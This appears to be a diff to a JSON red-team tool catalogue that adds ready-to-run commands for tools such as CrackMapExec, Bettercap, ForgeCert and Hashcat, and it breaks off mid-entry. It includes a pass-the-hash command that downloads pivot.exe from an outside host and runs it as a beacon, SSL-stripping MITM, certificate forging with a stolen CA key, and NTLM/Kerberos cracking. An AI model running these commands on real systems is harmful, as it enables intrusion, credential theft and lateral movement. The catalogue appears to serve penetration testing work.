@@ -137,12 +137,21 @@
         "platforms": [
             "Cross platforms (GO)"
         ],
-        "source": "https://github.com/OWASP/Amass",
+        "source": "https://github.com/owasp-amass/amass",
         "description": "The OWASP Amass Project performs network mapping of attack surfaces and external asset discovery using open source information gathering and active reconnaissance techniques.",
         "undetected": [],
         "detected": [],
         "content": "\n## [[Exposed Machines]]\nScan for external machines\n\n",
-        "commands": []
+        "commands": [
+            {
+                "id": "3d58a22c-e1ee-41b2-9c68-5a64efba043b",
+                "name": "Install",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "wget https://github.com/owasp-amass/amass/releases/latest"
+            }
+        ]
     },
     {
         "name": "API Monitor",
@@ -236,8 +245,17 @@
         "description": "A suite for man in the middle attacks",
         "undetected": [],
         "detected": [],
-        "content": "Bettercap\n---------\n\n[https://www.bettercap.org/usage/](https://www.bettercap.org/usage/)\n\nMitM with [sslstrip](sslstrip_1297023162.html)\n\n(May not work because of HSTS and the preload list containing websites that need to be HTTPS even on first connect)\n\n## [[08.Credentials & User Impersonation/MITM]]\n```java\nbettercap -G 192.168.1.1 -T 192.168.1.102 --proxy-https\n```\n\n\n",
-        "commands": []
+        "content": "Bettercap\n---------\n\n[https://www.bettercap.org/usage/](https://www.bettercap.org/usage/)\n\nMitM with [sslstrip](sslstrip_1297023162.html)\n\n(May not work because of HSTS and the preload list containing websites that need to be HTTPS even on first connect)\n\n## [[08.Credentials & User Impersonation/MITM]]\n'''java\nbettercap -G 192.168.1.1 -T 192.168.1.102 --proxy-https\n'''\n\n\n",
+        "commands": [
+            {
+                "id": "aae91a7b-6ae0-4c0b-b3d5-1298930bfe14",
+                "name": "MITM with SSL Stripping",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "bettercap -G 192.168.1.1 -T 192.168.1.102 --proxy-https"
+            }
+        ]
     },
     {
         "name": "BloodHound",
@@ -397,7 +415,7 @@
         "phases": [
             "02. Reconnaissance"
         ],
-        "category": "",
+        "category": "OSINT",
         "stealthy": false,
         "platforms": [
             "Linux"
@@ -407,7 +425,35 @@
         "undetected": [],
         "detected": [],
         "content": "\n## [[Passive Reconnaissance]]\n\n",
-        "commands": []
+        "commands": [
+            {
+                "id": "955ce93e-932e-4e5b-8e7a-8918611697dc",
+                "name": "Install",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "git clone https://github.com/galihap76/collector.git\ncd collector \npip install -r requirements.txt\npython3 main.py --update"
+            },
+            {
+                "id": "4875efe7-41e8-4700-b6eb-5413570b57b1",
+                "name": "Get info via IP",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "python3 main.py -i <ip address>",
+                "requirements": {
+                    "tag": "INTE"
+                }
+            },
+            {
+                "id": "87e07916-e228-4131-b0ee-d6112b46b00f",
+                "name": "Get info via Instagram",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "python3 main.py --login -u <YOUR USERNAME> -p <YOUR PASSWORD>\npython3 main.py -ig <target username>"
+            }
+        ]
     },
     {
         "name": "crackmapexec",
@@ -422,11 +468,62 @@
             "Linux"
         ],
         "source": "https://github.com/byt3bl33d3r/CrackMapExec",
-        "description": "",
+        "description": "CrackMapExec (a.k.a CME) is a post-exploitation tool that helps automate assessing the security of large Active Directory networks. Built with stealth in mind, CME follows the concept of \"Living off the Land\": abusing built-in Active Directory features/protocols to achieve it's functionality and allowing it to evade most endpoint protection/IDS/IPS solutions.",
         "undetected": [],
         "detected": [],
-        "content": "# Crackmapexec\n\n## Deploy custom beacon\ncrackmapexec smb 172.29.138.0/24 -u Administrator -H <hash> -x \"curl -o C:\\Windows\\Temp\\pivot.exe http://172.29.137.67:8081/pivot.exe\"\ncrackmapexec smb 172.29.138.0/24 -u Administrator -H <hash> -x \"powershell.exe Invoke-Command -ScriptBlock {C:\\Windows\\Temp\\pivot.exe}\"\n\n## Test multipe credentials\n```sh\n#Pattern: (.*):(.*):(.*):(.*):::\n#Replacement: crackmapexec smb 172.29.139.180 -u $1 -H $4 -x whoami\ncrackmapexec smb 172.29.139.180 -u <USER> -H <NTLM> -x whoami\n```\n\n## [[Guest Access (SMB)]]\nEnumerate null sessions\n>cme smb <ip> -u '' -p ''  \n\nEnumerate Anonymous access\n>cme smb <ip> -u 'a' -p ''\n\n## [[SMB Signing]]\nChecking for SMB signing\n\n## [[User enum]]\n>cme smb <ip> -u <user> -p '<password>' --users\n\n## [[Shares]]\n* Enumerate smb hosts  \n>cme smb <ip_range>\n\n",
-        "commands": []
+        "content": "# Crackmapexec\n\n## Deploy custom beacon\ncrackmapexec smb 172.29.138.0/24 -u Administrator -H <hash> -x \"curl -o C:\\Windows\\Temp\\pivot.exe http://172.29.137.67:8081/pivot.exe\"\ncrackmapexec smb 172.29.138.0/24 -u Administrator -H <hash> -x \"powershell.exe Invoke-Command -ScriptBlock {C:\\Windows\\Temp\\pivot.exe}\"\n\n## Test multipe credentials\n'''sh\n#Pattern: (.*):(.*):(.*):(.*):::\n#Replacement: crackmapexec smb 172.29.139.180 -u $1 -H $4 -x whoami\ncrackmapexec smb 172.29.139.180 -u <USER> -H <NTLM> -x whoami\n'''\n\n## [[Guest Access (SMB)]]\nEnumerate null sessions\n>cme smb <ip> -u '' -p ''  \n\nEnumerate Anonymous access\n>cme smb <ip> -u 'a' -p ''\n\n## [[SMB Signing]]\nChecking for SMB signing\n\n## [[User enum]]\n>cme smb <ip> -u <user> -p '<password>' --users\n\n## [[Shares]]\n* Enumerate smb hosts  \n>cme smb <ip_range>\n\n",
+        "commands": [
+            {
+                "id": "cba65b8b-1f83-467a-8608-4e3965340652",
+                "name": "Run command via SMB",
+                "description": "For example deploying a beacon via SMB",
+                "tag": "",
+                "results": [
+                    "EXECUTION:REMOTE"
+                ],
+                "cmd": "crackmapexec smb 172.29.138.0/24 -u Administrator -H <hash> -x \"curl -o C:\\Windows\\Temp\\pivot.exe http://172.29.137.67:8081/pivot.exe\"\ncrackmapexec smb 172.29.138.0/24 -u Administrator -H <hash> -x \"powershell.exe Invoke-Command -ScriptBlock {C:\\Windows\\Temp\\pivot.exe}\"",
+                "requirements": {
+                    "and": [
+                        {
+                            "tag": "CRED:HASH"
+                        },
+                        {
+                            "tag": "SERVICE:SMB"
+                        },
+                        {
+                            "tag": "PRIVS:ADMIN"
+                        }
+                    ]
+                }
+            },
+            {
+                "id": "624a21de-3375-4b68-868a-a6408521ce6b",
+                "name": "Enumerate null / anon sessions",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "cme smb <ip> -u '' -p ''\ncme smb <ip> -u 'a' -p ''"
+            },
+            {
+                "id": "641aee06-bfb3-41db-b032-58eb372f4b5c",
+                "name": "Remote user enumeration",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "cme smb <ip> -u <user> -p '<password>' --users"
+            },
+            {
+                "id": "9572ef78-24b0-4515-9fda-cd273050ae01",
+                "name": "Enumerate smb hosts",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "cme smb <ip_range>"
+            }
+        ],
+        "references": [
+            "https://wiki.porchetta.industries/"
+        ]
     },
     {
         "name": "cs2modrewrite",
@@ -467,7 +564,7 @@
         "phases": [
             "02. Reconnaissance"
         ],
-        "category": "",
+        "category": "OSINT",
         "stealthy": false,
         "platforms": [
             "Python"
@@ -477,7 +574,51 @@
         "undetected": [],
         "detected": [],
         "content": "\n## [[DNS]]\nEnumerate DNS\n\n",
-        "commands": []
+        "commands": [
+            {
+                "id": "56135c43-1def-4d31-80ba-2f00042555b8",
+                "name": "Base domain enumeration",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "dnsrecon -d www.acme.com"
+            },
+            {
+                "id": "59b387be-ae9c-4bda-8c05-e8c9a92faa45",
+                "name": "Base domain enum to SQL",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "dnsrecon -d www.acme.com --db /path/to/sqllite.file"
+            },
+            {
+                "id": "ddc7f920-b894-4b73-abc1-aa473288b980",
+                "name": "Zone walking",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "dnsrecon -d www.acme.com -t zonewalk"
+            },
+            {
+                "id": "19b43fa4-ebd8-4856-9aec-640afe215bba",
+                "name": "Brute-forcing of domains",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "dnsrecon -d www.acme.com -D /path/to/dict.txt -t brt"
+            },
+            {
+                "id": "88e7859d-2e6c-483a-ad2d-7c9d9376f74b",
+                "name": "Reverse lookup",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "dnsrecon -r 208.67.222.200-208.67.222.255 -d microsoft.com\n"
+            }
+        ],
+        "references": [
+            "https://www.kali.org/tools/dnsrecon/#:~:text=DNSRecon%20is%20a%20Python%20script,Perform%20common%20SRV%20Record%20Enumeration"
+        ]
     },
     {
         "name": "Dumpert",
@@ -508,12 +649,24 @@
         "platforms": [
             "Linux"
         ],
-        "source": "",
-        "description": "",
+        "source": "https://github.com/CiscoCXSecurity/enum4linux",
+        "description": "About enum4Linux is a Linux alternative to enum.exe for enumerating data from Windows and Samba hosts",
         "undetected": [],
         "detected": [],
         "content": "\n## [[Guest Access (SMB)]]\n> enum4linux -a -u \"\" -p \"\" <dc-ip>  \n> enum4linux -a -z \"guest\" -o \" <dc-ip>  \n\n## [[User enum]]\n> enum4linux -U <dc-ip> | grep 'user:'\n\n",
-        "commands": []
+        "commands": [
+            {
+                "id": "3b2630cc-65ab-4928-b46d-fc3f404c9283",
+                "name": "Commands",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "Usage: ./enum4linux.pl [options] ip\n\nOptions are (like \"enum\"):\n    -U        get userlist\n    -M        get machine list*\n    -S        get sharelist\n    -P        get password policy information\n    -G        get group and member list\n    -d        be detailed, applies to -U and -S\n    -u user   specify username to use (default \"\")  \n    -p pass   specify password to use (default \"\")"
+            }
+        ],
+        "references": [
+            "https://www.kali.org/tools/enum4linux/#:~:text=Enum4linux%20is%20a%20tool%20for,%2C%20rpclient%2C%20net%20and%20nmblookup"
+        ]
     },
     {
         "name": "Espoofer",
@@ -523,13 +676,24 @@
         ],
         "category": "",
         "stealthy": false,
-        "platforms": [],
+        "platforms": [
+            "Python"
+        ],
         "source": "https://github.com/chenjj/espoofer",
-        "description": "",
+        "description": "An email spoofing testing tool that aims to bypass SPF/DKIM/DMARC and forge DKIM signatures.\ud83c\udf7b",
         "undetected": [],
         "detected": [],
         "content": "\n## [[Internal Phishing]][[Phishing]]\nChecking for spoofable header\n\n",
-        "commands": []
+        "commands": [
+            {
+                "id": "2e5b14fc-a885-49d1-9c5f-2f8f04290901",
+                "name": "Install",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "git clone https://github.com/chenjj/espoofer\nsudo pip3 install -r requirements.txt"
+            }
+        ]
     },
     {
         "name": "Ettercap",
@@ -565,8 +729,17 @@
         "description": "EyeWitness is designed to take screenshots of websites provide some server header info, and identify default credentials if known.",
         "undetected": [],
         "detected": [],
-        "content": "This is tool capable of identifying (and taking screenshots of) web apps from a list of targets.\n\n## [[Find Web Server]]\nLocal Scan (does not work)\n>./EyeWitness.py --localscan 192.168.1.0/24\n\nScan with multiple IPs received from NMAP\n```sh\ncat /root/targets.txt\n10.10.17.71\n10.10.1.20\n10.10.17.68\n\nproxychains4 ./EyeWitness.py --web -f /root/targets.txt -d /root/edu --no-dns --no-prompt\n\nStarting Web Requests (3 Hosts)\nAttempting to screenshot http://10.10.17.71\n[*] WebDriverError when connecting to http://10.10.17.71\nAttempting to screenshot http://10.10.1.20\n[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.1.20:80  ...  OK\nAttempting to screenshot http://10.10.17.68\n[*] WebDriverError when connecting to http://10.10.17.68\nFinished in 12.967030048370361 seconds\n```\n\n",
-        "commands": []
+        "content": "This is tool capable of identifying (and taking screenshots of) web apps from a list of targets.\n\n## [[Find Web Server]]\nLocal Scan (does not work)\n>./EyeWitness.py --localscan 192.168.1.0/24\n\nScan with multiple IPs received from NMAP\n'''sh\ncat /root/targets.txt\n10.10.17.71\n10.10.1.20\n10.10.17.68\n\nproxychains4 ./EyeWitness.py --web -f /root/targets.txt -d /root/edu --no-dns --no-prompt\n\nStarting Web Requests (3 Hosts)\nAttempting to screenshot http://10.10.17.71\n[*] WebDriverError when connecting to http://10.10.17.71\nAttempting to screenshot http://10.10.1.20\n[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.1.20:80  ...  OK\nAttempting to screenshot http://10.10.17.68\n[*] WebDriverError when connecting to http://10.10.17.68\nFinished in 12.967030048370361 seconds\n'''\n\n",
+        "commands": [
+            {
+                "id": "f859e696-2096-4bbe-8a8f-1164b0d99f7a",
+                "name": "Scan IP's from file",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "proxychains4 ./EyeWitness.py --web -f /root/targets.txt -d /root/edu --no-dns --no-prompt\n"
+            }
+        ]
     },
     {
         "name": "FinalRecon",
@@ -582,8 +755,49 @@
         "description": "FinalRecon is an automatic web reconnaissance tool written in python. Goal of FinalRecon is to provide an overview of the target in a short amount of time while maintaining the accuracy of results. Instead of executing several tools one after another it can provide similar results keeping dependencies small and simple.",
         "undetected": [],
         "detected": [],
-        "content": "## Installation\n```sh\ngit clone https://github.com/thewhiteh4t/FinalRecon.git\ncd FinalRecon\npip3 install -r requirements.txt\n```\n\n## [[Passive Reconnaissance]]\n```sh\npython3 finalrecon.py -h\nusage: finalrecon.py [-h] [--headers] [--sslinfo] [--whois] [--crawl] [--full]\n                     url\n\nFinalRecon - OSINT Tool for All-In-One Web Recon | v1.0.0\n\npositional arguments:\n  url         Target URL\n\noptional arguments:\n  -h, --help  show this help message and exit\n  --headers   Get Header Information\n  --sslinfo   Get SSL Certificate Information\n  --whois     Get Whois Lookup\n  --crawl     Crawl Target Website\n  --full      Get Full Analysis, Test All Available Options\n\n# Check headers\npython3 finalrecon.py --headers <url>\n\n# Check ssl Certificate\npython3 finalrecon.py --sslinfo <url>\n\n# Check whois Information\npython3 finalrecon.py --whois <url>\n\n# Crawl Target\npython3 finalrecon.py --crawl <url>\n\n# full scan\npython3 finalrecon.py --full <url>\n```\n\n\n",
-        "commands": []
+        "content": "## Installation\n'''sh\ngit clone https://github.com/thewhiteh4t/FinalRecon.git\ncd FinalRecon\npip3 install -r requirements.txt\n'''\n\n## [[Passive Reconnaissance]]\n'''sh\npython3 finalrecon.py -h\nusage: finalrecon.py [-h] [--headers] [--sslinfo] [--whois] [--crawl] [--full]\n                     url\n\nFinalRecon - OSINT Tool for All-In-One Web Recon | v1.0.0\n\npositional arguments:\n  url         Target URL\n\noptional arguments:\n  -h, --help  show this help message and exit\n  --headers   Get Header Information\n  --sslinfo   Get SSL Certificate Information\n  --whois     Get Whois Lookup\n  --crawl     Crawl Target Website\n  --full      Get Full Analysis, Test All Available Options\n\n# Check headers\npython3 finalrecon.py --headers <url>\n\n# Check ssl Certificate\npython3 finalrecon.py --sslinfo <url>\n\n# Check whois Information\npython3 finalrecon.py --whois <url>\n\n# Crawl Target\npython3 finalrecon.py --crawl <url>\n\n# full scan\npython3 finalrecon.py --full <url>\n'''\n\n\n",
+        "commands": [
+            {
+                "id": "3f7795a8-a883-450f-900d-6b37c0dd9449",
+                "name": "Install",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "git clone https://github.com/thewhiteh4t/FinalRecon.git\ncd FinalRecon\npip3 install -r requirements.txt"
+            },
+            {
+                "id": "3ea5ed52-fa49-4ad3-a7f2-3e7e49b873ae",
+                "name": "Check SSL Certificate",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "python3 finalrecon.py --sslinfo <url>"
+            },
+            {
+                "id": "447d2228-3aac-45cf-86aa-35183a405b2c",
+                "name": "Check whois Information",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "python3 finalrecon.py --whois <url>"
+            },
+            {
+                "id": "511c55e2-eaef-4a11-9a62-54d74a89736b",
+                "name": "Crawl Target",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "python3 finalrecon.py --crawl <url>"
+            },
+            {
+                "id": "787e77cb-9e0b-4164-a58b-210b751f28f1",
+                "name": "Full Scan",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "python3 finalrecon.py --full <url>"
+            }
+        ]
     },
     {
         "name": "FOCA",
@@ -617,8 +831,17 @@
         "description": "Generate certs",
         "undetected": [],
         "detected": [],
-        "content": "# ForgeCert\n\n## [[Forged Certificates]]\nGenerate certificate with stolen pk\n```beacon\nC:\\Users\\Administrator\\Desktop>C:\\Tools\\ForgeCert\\ForgeCert\\bin\\Debug\\ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword \"password\" --Subject \"CN=User\" --SubjectAltName \"Administrator@evil.corp\" --NewCertPath fake.pfx --NewCertPassword \"password\"\nCA Certificate Information:\n  Subject:        CN=ca-1, DC=evil, DC=corp\n  Issuer:         CN=ca-1, DC=evil, DC=corp\n  Start Date:     2/25/2022 11:29:14 AM\n  End Date:       2/25/2047 11:39:08 AM\n  Thumbprint:     7F8A1EFB7A50E2D1DE098085301926AA13AE0A71\n  Serial:         31AC83C6678F28994CFB58207C9FB668\n\nForged Certificate Information:\n  Subject:        CN=User\n  SubjectAltName: Administrator@evil.corp\n  Issuer:         CN=ca-1, DC=evil, DC=corp\n  Start Date:     3/1/2022 2:19:20 PM\n  End Date:       3/1/2023 2:19:20 PM\n  Thumbprint:     73C45EC22357C0451E0F374AC30B5C6F6034B132\n  Serial:         009E1C0AE8A247695199F8157DB37E38AD\n\nDone. Saved forged certificate to fake.pfx with the password 'password'\n```\n\n",
-        "commands": []
+        "content": "# ForgeCert\n\n## [[Forged Certificates]]\nGenerate certificate with stolen pk\n'''beacon\nC:\\Users\\Administrator\\Desktop>C:\\Tools\\ForgeCert\\ForgeCert\\bin\\Debug\\ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword \"password\" --Subject \"CN=User\" --SubjectAltName \"Administrator@evil.corp\" --NewCertPath fake.pfx --NewCertPassword \"password\"\nCA Certificate Information:\n  Subject:        CN=ca-1, DC=evil, DC=corp\n  Issuer:         CN=ca-1, DC=evil, DC=corp\n  Start Date:     2/25/2022 11:29:14 AM\n  End Date:       2/25/2047 11:39:08 AM\n  Thumbprint:     7F8A1EFB7A50E2D1DE098085301926AA13AE0A71\n  Serial:         31AC83C6678F28994CFB58207C9FB668\n\nForged Certificate Information:\n  Subject:        CN=User\n  SubjectAltName: Administrator@evil.corp\n  Issuer:         CN=ca-1, DC=evil, DC=corp\n  Start Date:     3/1/2022 2:19:20 PM\n  End Date:       3/1/2023 2:19:20 PM\n  Thumbprint:     73C45EC22357C0451E0F374AC30B5C6F6034B132\n  Serial:         009E1C0AE8A247695199F8157DB37E38AD\n\nDone. Saved forged certificate to fake.pfx with the password 'password'\n'''\n\n",
+        "commands": [
+            {
+                "id": "769c8351-fac6-43a1-abf8-e5ddcf6630d7",
+                "name": "Forge Cert with PK",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword \"password\" --Subject \"CN=User\" --SubjectAltName \"Administrator@evil.corp\" --NewCertPath fake.pfx --NewCertPassword \"password\""
+            }
+        ]
     },
     {
         "name": "FreeRDP",
@@ -670,7 +893,56 @@
         "undetected": [],
         "detected": [],
         "content": "\n## [[Find Web Server]]\nScan internal network\n* Screenshot a single website  \n> gowitness single https://www.google.com/\n* Screenshot a cidr using 20 threads  \n> gowitness scan --cidr 192.168.0.0/24 --threads 20\n* Scan based on Nessus scan\n> .\\gowitness-2.4.0-windows-amd64.exe nessus -f .\\ScanniSceneroni_xm6g2a.nessus\n* Scan based on URL/IP file\n> .\\gowitness-2.4.0-windows-amd64.exe file -f '.\\External Pentesting\\urls.txt'\n* Screenshot open http services from an namp file  \n> gowitness nmap -f nmap.xml --open --service-contains http\n* Run the report server  \n> gowitness report serve\n\n",
-        "commands": []
+        "commands": [
+            {
+                "id": "78c1f2ef-d03b-4d0e-af0c-63566fe1733b",
+                "name": "Screenshot a single website",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "gowitness single https://www.google.com/"
+            },
+            {
+                "id": "2683dac7-4a17-4e8b-b069-8332b5df95d9",
+                "name": "Screenshot a cidr using 20 threads",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "gowitness scan --cidr 192.168.0.0/24 --threads 20"
+            },
+            {
+                "id": "0564da3e-27bf-4b2a-8fa0-48aeed967903",
+                "name": "Scan based on Nessus scan",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": ".\\gowitness-2.4.0-windows-amd64.exe nessus -f .\\ScanniSceneroni_xm6g2a.nessus"
+            },
+            {
+                "id": "966b5f10-0d75-4aeb-aae8-442a9d97e8fe",
+                "name": "Scan based on URL/IP file",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": ".\\gowitness-2.4.0-windows-amd64.exe file -f 'urls.txt"
+            },
+            {
+                "id": "635a546b-c13d-459b-a173-7230bcb506bb",
+                "name": "Screenshot open http services from an nmap file",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "gowitness nmap -f nmap.xml --open --service-contains http"
+            },
+            {
+                "id": "e5a98439-d851-45e1-9047-2b36877d7c6d",
+                "name": "Run the report server",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "gowitness report serve"
+            }
+        ]
     },
     {
         "name": "GPRegistryPolicyParser",
@@ -745,11 +1017,60 @@
             "Linux"
         ],
         "source": "https://hashcat.net/hashcat/",
-        "description": "",
+        "description": "World's fastest password cracker\nWorld's first and only in-kernel rule engine",
         "undetected": [],
         "detected": [],
-        "content": "# Hashcat\n\n\n## Commands\n- `-a 0` specifies the wordlist attack mode.\n- `-m 1000` specifies that the hash is NTLM.\n- `C:\\Temp\\ntlm.txt` is a text file containing the NTLM hash to crack.\n- `D:\\Tools\\rockyou.txt` is the wordlist.\n- `-r rules\\add-year.rule` is our custom rule file\n\n## Bruteforce NTLM\n- `-a 3` specifies the mask attack.\n- `?u?l?l?l?l?l?l?l?d` is the mask.\n\n| ?   | Charset                                |\n| --- | -------------------------------------- |\n| l   | abcdefghijklmnopqrstuvwxyz             |\n| u   | ABCDEFGHIJKLMNOPQRSTUVWXYZ             |\n| d   | 0123456789                             |\n| h   | 0123456789abcdef                       |\n| H   | 0123456789ABCDEF                       |\n| s   | `!\"#$%&'()*+,-./:;<=>?@[\\]^_``{ \\| }~` |\n| a   | ?l?u?d?s                               |\n| b   | 0x00 - 0xff                            |\n\n## [[Crack Credentials]]\n## Cracking NTLM\n``````sh\nhashcat.exe -w 3 -r /rules/oneruletorulethemall -a 0 -m 1000 ntlm.txt C:\\Temp\\ntlm.txt D:\\Tools\\rockyou.txt\n``````\n\n``````beacon\nhashcat.exe -a 3 -m 1000 C:\\Temp\\ntlm.txt ?u?l?l?l?l?l?l?l?d\n``````\n\n## Cracking krb5tgs\n``````sh\nhashcat.exe -w 3 -r /rules/oneruletorulethemall -a 0 -m 13100 ntlm.txt C:\\Temp\\ntlm.txt D:\\Tools\\rockyou.txt\n``````\n\n## Cracking krb5asrep\n``````sh\nhashcat.exe -w 3 -r /rules/oneruletorulethemall -a 0 -m 18200 ntlm.txt C:\\Temp\\ntlm.txt D:\\Tools\\rockyou.txt\n``````\n\n## Cracking netntlmv2\n```sh\nhashcat.exe -w 3 -r /rules/oneruletorulethemall -a 0 -m 5600 ntlm.txt C:\\Temp\\ntlm.txt D:\\Tools\\rockyou.txt\n```\n\n\n",
-        "commands": []
+        "content": "# Hashcat\n\n\n## Commands\n- '-a 0' specifies the wordlist attack mode.\n- '-m 1000' specifies that the hash is NTLM.\n- 'C:\\Temp\\ntlm.txt' is a text file containing the NTLM hash to crack.\n- 'D:\\Tools\\rockyou.txt' is the wordlist.\n- '-r rules\\add-year.rule' is our custom rule file\n\n## Bruteforce NTLM\n- '-a 3' specifies the mask attack.\n- '?u?l?l?l?l?l?l?l?d' is the mask.\n\n| ?   | Charset                                |\n| --- | -------------------------------------- |\n| l   | abcdefghijklmnopqrstuvwxyz             |\n| u   | ABCDEFGHIJKLMNOPQRSTUVWXYZ             |\n| d   | 0123456789                             |\n| h   | 0123456789abcdef                       |\n| H   | 0123456789ABCDEF                       |\n| s   | '!\"#$%&'()*+,-./:;<=>?@[\\]^_''{ \\| }~' |\n| a   | ?l?u?d?s                               |\n| b   | 0x00 - 0xff                            |\n\n## [[Crack Credentials]]\n## Cracking NTLM\n''''''sh\nhashcat.exe -w 3 -r /rules/oneruletorulethemall -a 0 -m 1000 ntlm.txt C:\\Temp\\ntlm.txt D:\\Tools\\rockyou.txt\n''''''\n\n''''''beacon\nhashcat.exe -a 3 -m 1000 C:\\Temp\\ntlm.txt ?u?l?l?l?l?l?l?l?d\n''''''\n\n## Cracking krb5tgs\n''''''sh\nhashcat.exe -w 3 -r /rules/oneruletorulethemall -a 0 -m 13100 ntlm.txt C:\\Temp\\ntlm.txt D:\\Tools\\rockyou.txt\n''''''\n\n## Cracking krb5asrep\n''''''sh\nhashcat.exe -w 3 -r /rules/oneruletorulethemall -a 0 -m 18200 ntlm.txt C:\\Temp\\ntlm.txt D:\\Tools\\rockyou.txt\n''''''\n\n## Cracking netntlmv2\n'''sh\nhashcat.exe -w 3 -r /rules/oneruletorulethemall -a 0 -m 5600 ntlm.txt C:\\Temp\\ntlm.txt D:\\Tools\\rockyou.txt\n'''\n\n\n",
+        "commands": [
+            {
+                "id": "4dcdc386-2ceb-431c-acf6-a9c2d55130e9",
+                "name": "Cracking NTLM",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "hashcat.exe -w 3 -r /rules/oneruletorulethemall -a 0 -m 1000 ntlm.txt C:\\Temp\\ntlm.txt D:\\Tools\\rockyou.txt"
+            },
+            {
+                "id": "e2ec4a29-5912-4fec-8b42-339a639391a7",
+                "name": "Bruteforce NTLM",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": ""
+            },
+            {
+                "id": "da7d5aea-fb2f-411d-bc82-b59f1c96a552",
+                "name": "Cracking krb5tgs",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "hashcat.exe -w 3 -r /rules/oneruletorulethemall -a 0 -m 13100 ntlm.txt C:\\Temp\\ntlm.txt D:\\Tools\\rockyou.txt"
+            },
+            {
+                "id": "742234d5-3e4a-4261-b2b7-dad52e4200ae",
+                "name": "Cracking krb5asrep",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "hashcat.exe -w 3 -r /rules/oneruletorulethemall -a 0 -m 18200 ntlm.txt C:\\Temp\\ntlm.txt D:\\Tools\\rockyou.txt"
+            },
+            {
+                "id": "2ae08370-f66a-4fac-bad8-da25f0af8ed9",
+                "name": "Cracking netntlmv2",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "hashcat.exe -w 3 -r /rules/oneruletorulethemall -a 0 -m 5600 ntlm.txt C:\\Temp\\ntlm.txt D:\\Tools\\rockyou.txt"
+            },
+            {
+                "id": "64f215f3-7434-44fc-8dc1-2118e7db6a1c",
+                "name": "Bruteforce Rules",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "-a 3 specifies the mask attack.\n?u?l?l?l?l?l?l?l?d is the mask.\n\n?\tCharset\n------------------------\nl\tabcdefghijklmnopqrstuvwxyz\nu\tABCDEFGHIJKLMNOPQRSTUVWXYZ\nd\t0123456789\nh\t0123456789abcdef\nH\t0123456789ABCDEF\ns\t!\"#$%&'()*+,-./:;<=>?@[\\]^_''{ | }~\na\t?l?u?d?s\nb\t0x00 - 0xff"
+            }
+        ]
     },
     {
         "name": "HeidiSQL",
@@ -943,15 +1264,38 @@
         "description": "Allows you to specify custom LDAP queries",
         "undetected": [],
         "detected": [],
-        "content": "# ldapsearch\n\n## [[Validate Credentials]]\n1. Get [[Domain Controller]]\n2. Login\n    `.\\\\ldapsearch.exe -x -h 127.0.0.1 -b dc=maxcrc,dc=com -w PW -D \"cn=admin\"`\n\n3. Flags\n    * x: anonymous connect\n    * h: server\n    * b: root (domain component)\n    * w: password\n    * W: interactive password\n    * D: binddn - user\n\n## [[User enum]]\n> ldapsearch -x -h <ip> -s base\n\n",
-        "commands": []
+        "content": "# ldapsearch\n\n## [[Validate Credentials]]\n1. Get [[Domain Controller]]\n2. Login\n    '.\\\\ldapsearch.exe -x -h 127.0.0.1 -b dc=maxcrc,dc=com -w PW -D \"cn=admin\"'\n\n3. Flags\n    * x: anonymous connect\n    * h: server\n    * b: root (domain component)\n    * w: password\n    * W: interactive password\n    * D: binddn - user\n\n## [[User enum]]\n> ldapsearch -x -h <ip> -s base\n\n",
+        "commands": [
+            {
+                "id": "f3f95224-0c24-4a55-8c3b-4fea8d7ae490",
+                "name": "Login",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": ".\\\\ldapsearch.exe -x -h 127.0.0.1 -b dc=maxcrc,dc=com -w PW -D \"cn=admin\"",
+                "requirements": {
+                    "tag": "INTEL:DOMAIN:DC"
+                }
+            },
+            {
+                "id": "e567991e-b395-4f77-ae7c-05961fbfd03d",
+                "name": "User enum",
+                "description": "",
+                "tag": "",
+                "results": [],
+                "cmd": "ldapsearch -x -h <ip> -s base",
+                "requirements": {
+                    "tag": "INTEL:DOMAIN:DC"
+                }
+            }
+        ]
     },
     {
         "name": "linedInt",
         "phases": [
             "02. Reconnaissance"
         ],
-        "category": "",
+        "category": "OSINT",
         "stealthy": false,
         "platforms": [
             "Python"
@@ -961,14 +1305,31 @@
         "undetected": [],
         "detected": [],
         "content": "\n## [[LinkedIn]]\n\n",
-        "commands": []
+        "commands": [
+            {
